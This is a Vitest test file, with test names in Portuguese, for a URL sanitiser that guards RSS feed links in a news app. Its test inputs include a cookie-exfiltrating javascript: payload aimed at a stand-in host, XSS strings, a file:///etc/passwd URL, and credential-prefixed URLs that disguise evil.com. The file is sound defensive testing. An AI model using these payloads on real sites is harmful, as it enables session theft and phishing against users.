import { describe, expect, it } from 'vitest'
import { safeExternalUrl } from './url'

describe('safeExternalUrl', () => {
  it('rejeita esquemas executáveis', () => {
    // O vetor real: <link> de feed RSS renderizado como href.
    expect(safeExternalUrl("javascript:fetch('//x/'+document.cookie)")).toBeNull()
    expect(safeExternalUrl('JavaScript:alert(1)')).toBeNull()
    expect(safeExternalUrl('  javascript:alert(1)  ')).toBeNull()
    expect(safeExternalUrl('data:text/html,<script>alert(1)</script>')).toBeNull()
    expect(safeExternalUrl('vbscript:msgbox(1)')).toBeNull()
    expect(safeExternalUrl('file:///etc/passwd')).toBeNull()
  })

  it('rejeita credenciais embutidas, que disfarçam o host real', () => {
    expect(safeExternalUrl('https://portal.gov.br@evil.com/x')).toBeNull()
    expect(safeExternalUrl('https://user:senha@evil.com/x')).toBeNull()
  })

  it('rejeita entrada vazia ou não-string', () => {
    expect(safeExternalUrl('')).toBeNull()
    expect(safeExternalUrl('   ')).toBeNull()
    expect(safeExternalUrl(null)).toBeNull()
    expect(safeExternalUrl(undefined)).toBeNull()
    expect(safeExternalUrl(42)).toBeNull()
    expect(safeExternalUrl('não é uma url')).toBeNull()
  })

  it('aceita links de notícia normais', () => {
    expect(safeExternalUrl('https://g1.globo.com/materia.html')).toBe('https://g1.globo.com/materia.html')
    expect(safeExternalUrl('http://portosenavios.com.br/x?a=1&b=2')).toBe(
      'http://portosenavios.com.br/x?a=1&b=2'
    )
  })

  it('resolve forma relativa ao protocolo só quando há base', () => {
    expect(safeExternalUrl('//g1.globo.com/x', 'https://news.google.com/rss')).toBe(
      'https://g1.globo.com/x'
    )
    expect(safeExternalUrl('//g1.globo.com/x')).toBeNull()
  })
})
